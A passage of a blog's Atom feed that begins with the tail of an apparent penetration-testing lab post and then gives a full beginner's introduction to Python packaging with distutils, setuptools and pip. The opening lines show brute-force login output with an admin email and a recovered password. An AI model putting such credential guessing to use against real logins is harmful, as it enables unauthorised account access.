Try 478 - email: admin@pentesteracademy.com password: zzzxy
{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
</code></p>

<p>Today&rsquo;s fortune cookie:</p>

<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
are making another attack.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Python packaging]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging/"/>
    <updated>2014-07-20T15:14:31-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging</id>
    <content type="html"><![CDATA[<p>There is a lot of confusion and heated debate over the Python packaging system. In this post I want to cover the basics of it so it&rsquo;s easier to understand.</p>

<!-- more -->


<p>One of the strengths of the Python programming language is its rich standard library that contains many useful modules suited for various tasks. However, more often than not, you will need to enhance the already rich standard library with additional, third party packages that are not installed by default. So, how do you install new packages?</p>

<h4>What is a package?</h4>

<p>First of all, a package in Python is simply a directory that contains a file named <code><strong>init</strong>.py</code>. You can make your own packages by creating a directory with your desired name and creating an init file like the above inside it. Then you can import your package like you do with the rest.</p>

<h4>The manual way</h4>

<p>Of course, it&rsquo;s possible to manually install packages by unpacking their respective tarballs and dropping them in the directory where modules are installed. On Windows, this directory is called <strong>site-packages</strong> and it can be found in your Python install directory: <code>C:\Python27\Lib\site-packages</code>. On Linux, it&rsquo;s named <strong>dist-packages</strong> and you can find it in <code>/usr/lib/python2.7/dist-packages</code>. Remember to account for your actual installation directories and Python versions, these are the examples from my machines.</p>

<h4>Using a package manager</h4>

<p>A package manager is supposed to ease the process of installing and maintaining packages in a centralized way. This is the more convenient way of installing new Python packages. Here are some benefits of packaging as explained on <a href="http://guide.python-distribute.org/introduction.html">The Hitchhiker’s Guide to Packaging</a>:</p>

<blockquote><ul>
<li>Dependency management</li>
</ul>


<p>Often, the package you want to install requires that others be there. A package management system can
automatically resolve dependencies and make your installation pain free and quick. This is one of the basic
facilities offered by distutils. However, other extensions to distutils do a better job of installing
dependencies.</p>

<ul>
<li>Accounting</li>
</ul>


<p>Package managers can maintain lists of things installed and other metadata like the version installed etc.
which makes is easy for the user to know what are the things his system has.</p>

<ul>
<li>Uninstall</li>
</ul>


<p>Package managers can give you push button ways of removing a package from your environment.</p>

<ul>
<li>Search</li>
</ul>


<p>Find packages by searching a package index for specific terminology</p></blockquote>

<p><strong>distutils</strong></p>

<p>The standard package manager that comes preinstalled with Python is distutils. The standard distribution follows a certain pattern, such as the archive name and unpacking directory having a name composed from the name and version of the distribution, like so: <code>name-version</code>. Here&rsquo;s an example: <code>foo-1.0</code>.</p>

<p>Also, the distribution should contain a setup script called <code>setup.py</code> and a README file with instructions on how to install it. The command <code>python setup.py install</code> is used for building and installation. If you want to break up this process, you can choose to build it yourself first, by running <code>python setup.py build</code>, This will put the files that are to be installed in a build directory. Afterwards, you can run the install command to copy these files in your install directory.</p>

<p><strong>setuptools</strong></p>

<p>setuptools is supposed to enhance the features of distutils. It brings to the table a module called <strong>easy_install</strong> that lets you automatically download, build, install, and manage Python packages.</p>

<p>To install setuptools, you have to run the <a href="https://bootstrap.pypa.io/ez_setup.py"><em>ez_setup.py</em></a> script. And to install a package with easy_install, you just do <code>easy_install package name</code>.</p>

<p><strong>pip</strong></p>

<p>pip is an alternative Python package installer. It performs the same basic job as easy_install, but with some extra features. It can work with version control repositories (currently only Git, Mercurial, andBazaar repositories), logs output extensively, and prevents partial installs by downloading all requirements before starting installation.</p>

<p>To install pip, download and run <a href="https://bootstrap.pypa.io/get-pip.py"><em>get-pip.py</em></a>. With pip you can easily manage your Python packages from the command line:</p>

<ul>
<li><p>install a package: <code>pip install package name</code></p></li>
<li><p>uninstall a package: <code>pip uninstall package name</code></p></li>
<li><p>upgrade a package to its latest version: <code>pip install -U package name</code> (alternatively, you can also use the &mdash;upgrade flag)</p></li>
<li><p>list installed packages: <code>pip list</code></p></li>
<li><p>show information about one or more installed packages <code>pip show package name</code></p></li>
</ul>


<p>Due to its features and convenience, pip is my favorite package installer. Of course, there are more advanced features in Python packaging, but I hope this introduction was helpful for getting to install and manage your packages.</p>

<blockquote><p>You will stop at nothing to reach your objective, but only because your brakes are defective.</p></blockquote>
]]></content>
  </entry>
  
</feed>
